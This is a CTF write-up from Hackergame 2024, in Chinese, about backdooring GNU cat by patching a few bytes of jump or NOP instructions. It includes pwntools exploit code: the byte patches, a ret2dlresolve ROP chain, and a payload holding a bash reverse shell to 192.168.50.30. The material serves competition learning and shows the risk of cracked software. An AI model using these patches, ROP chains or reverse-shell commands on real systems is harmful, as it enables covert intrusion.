# cat 绿色破解版

题解作者：[eastXueLian](https://github.com/AvavaAYA)

出题人、验题人、文案设计等：见 [Hackergame 2024 幕后工作人员](../../credits.pdf)。

## 题目描述

- 题目分类：binary

- 题目分值：350

在电脑里装满了「`[0-9]{3,4}` 全家桶」、「`..` 壁纸」等软件后，小 E 同学不得不购入新电脑。

但是小 E 还是不舍得购入正版软件：「众所周知，软件破解做的事情不过是在关键地方改个跳转、NOP 掉少许指令或者清除几个字节罢了。我会仔细检查破解软件与原版软件的区别，确保只有不超过 5 字节被修改为跳转指令、NOP 指令或者 0」。

「让我来试试这个群里看到的 `cat` 绿色破解版有什么不一样」

> **上述场景和情节均为虚构，未基于任何真实事件或人物。如与现实有任何相似之处，纯属巧合。**

附件中包含从 [coreutils-9.5](https://ftp.gnu.org/gnu/coreutils/coreutils-9.5.tar.xz) 源码编译得到的 `cat` 程序。作为一名顶尖黑客，你的任务是在不引起小 E 警觉的情况下，通过魔改 `cat` 程序来控制他的新电脑。

你可以在原程序的基础上篡改至多五字节，需要满足以下条件：

1. 只能修改代码段从 `_start` 函数到 `_term_proc` 函数之间的内容
2. 修改的偏移量之间相差不能小于 8
3. 小 E 会依次检查每个改动的字节，确保它们属于跳转指令、NOP 指令或者零；**其中小 E 会有一次眼花**

检查脚本见附件 `xiao_E_checker.py`。

在修改完成后，小 E 会进行功能上的验证，包括：

1. 检查 cat 的输出是否正确：`cat secret`
2. 与你通过标准输入进行交互：`cat secret -`

你的目标是传入特定的数据，触发植入的后门，从而将自己的大名留在小 E 新电脑的 `/dev/shm/hacked` 文件中获取 flag。

**[点击下载题目附件](files/green_cat.zip)**

你可以通过 `nc 202.38.93.141 31339` 来连接，或者点击下面的「打开/下载题目」按钮通过网页终端与远程交互。

> 如果你不知道 `nc` 是什么，或者在使用上面的命令时遇到了困难，可以参考我们编写的 [萌新入门手册：如何使用 nc/ncat？](https://lug.ustc.edu.cn/planet/2019/09/how-to-use-nc/)

[打开/下载题目](http://202.38.93.141:31340/?token={token})

## 题解

本题的 idea 是 [@zzh1996](https://github.com/zzh1996) 的。我做了实现。

题目模拟了一个破解软件植入后门的场景：通过修改跳转指令或者 `NOP` 部分字节植入隐蔽的后门，最终实现任意代码执行。

笔者选择了逻辑相对简单的 cat 程序并将目光放在 `simple_cat` 函数中：

- 前两处 patch 都是针对 `safe_read (input_desc, buf, bufsize)` 和 `full_write (STDOUT_FILENO, buf, n_read)` 中的 `buf`。在函数中 `buf` 作为实参被放在栈上，在使用时表示为 `QWORD PTR [rbp-0x38]`。为避免影响 `canary`，可以通过清零相应字节把缓冲区转移到主函数的栈底，即 `QWORD PTR [rbp]`。现在拥有了栈溢出劫持控制流的能力。

- 为了避免传入 `EOF`，可以选择将写任意字节的能力用于修改跳转 `0x402f9c: je 0x402ef9 <simple_cat+0x15>`，使 `simple_cat` 经过一轮 `read` / `write` 后就直接返回。

- 但是发现主函数中会执行 `close(0)`，故定位到其前面的条件判断，修改 `0x4041ca: je 0x40422c <main+0xa1d>` 中的跳转指令为 `jne`。现在拥有了任意地址读写的能力。

```python
    io.recvuntil(b"[*] How many bytes do you want to modify?")
    io.sendline(i2b(4))
    io.recvuntil(b"[*] Enter offset: ")
    io.sendline(i2b(0x2F87 + 3))
    io.recvuntil(b"[*] Enter data: ")
    io.sendline(i2b(0))

    io.recvuntil(b"[*] Enter offset: ")
    io.sendline(i2b(0x2F03 + 3))
    io.recvuntil(b"[*] Enter data: ")
    io.sendline(i2b(0))

    io.recvuntil(b"[*] Enter offset: ")
    io.sendline(i2b(0x41CA))
    io.recvuntil(b"[*] Enter data: ")
    io.sendline(i2b(0x75))

    io.recvuntil(b"[*] Enter offset: ")
    io.sendline(i2b(0x2F9E))
    io.recvuntil(b"[*] Enter data: ")
    io.sendline(i2b(0xDA))
    io.recvuntil(b"RUNNING!\n")
```

关于利用，笔者希望通过 `ret2dlresolve` 来实现 `getshell`，利用方法如下：

```python
my_buf = 0x40D000 + 0x480
l_addr = libc.sym.system - libc.sym.free
r_offset = my_buf + 0x200 - l_addr
fake_rel_addr = my_buf + 0x38

if l_addr < 0:
    l_addr = (1 << 64) + l_addr

dynstr = elf.get_section_by_name(".dynstr").header.sh_addr
plt0 = elf.get_section_by_name(".plt").header.sh_addr
read_plt = elf.plt.read

somegadget_2_ctl_rdx_0 = (
    0x0000000000402BBC  # cmp dword ptr [rbp - 4], 0x5f ; sete al ; pop rbp ; ret
)
somegadget_2_ctl_rdx_1 = 0x0000000000407E75  # pop rdx ; jg 0x40810a
ctl_rdi = 0x0000000000406E0E  # pop rdi ; pop rbp ; ret
ctl_rsi = 0x0000000000406E0C  # pop rsi ; pop r15 ; pop rbp ; ret
ctl_rbp = 0x000000000040285D  # pop rbp ; ret

payload = flat(
    {
        8: [
            ctl_rbp,
            0x40D2A0 + 4,
            somegadget_2_ctl_rdx_0,
            0x40D2A0 + 4,
            somegadget_2_ctl_rdx_1,
            0x200,  # rdx
            0,  # rbp
            ctl_rdi,  # ret
            0,
            0,
            ctl_rsi,
            my_buf,
            0,
            0,
            read_plt,
            ctl_rbp + 1,
            ctl_rdi,
            my_buf + 0x100,
            0,
            0x402026,
            my_buf,
            0,
        ]
    }
)
io.send(payload)

payload = flat(
    {
        0x00: [l_addr],
        0x08: [0x05, dynstr],
        0x18: [0x06, 0x40D000 - 8],
        0x28: [0x11, fake_rel_addr],
        0x38: [r_offset, 7],
        0x68: [
            my_buf + 0x08,
            my_buf + 0x18,
        ],
        0xF8: [my_buf + 0x28],
        0x100: b"bash -i >& /dev/tcp/192.168.50.30/2299 0>&1\x00",
    },
)
io.send(payload)
```

为了增加趣味性，简化最后一步利用，题目要求选手将 `hacked by xxx` 写入 `/dev/shm/hacked` 以得到 flag。不过这也使得 `open` + `write` 的 `ROP` 链就能完成目标，在不 `getshell` 的情况下可以只用 2 字节的修改拿到 flag，代码见 [open_write_exp.py](src/open_write_exp.py)。

完整利用代码见 [green_cat-exp.py](./src/green_cat-exp.py)。

---

## 出题思路提供者的话

本节作者：[@zzh1996](https://github.com/zzh1996)

我其实很早就想过一个问题：如果下载到一个破解版软件，然后跟原版 diff 发现只是修改了其中的两个跳转指令，或者 NOP 掉了一些检查，那我们是否可以相信，运行这个破解版（不考虑软件原作者故意搞事情）是否可以相信是安全的？

我想了想应该不能保证是安全的，所以就想出这道题。然而我不太会 pwn，所以跟 [eastXueLian](https://github.com/AvavaAYA) 说了一下想法，他把这个思路出成了题。虽然也不是完全还原这个场景，但是我觉得还是蛮有趣的。如果把 cat 换成一些更复杂的软件，说不定改一个字节就可以做到类似效果。
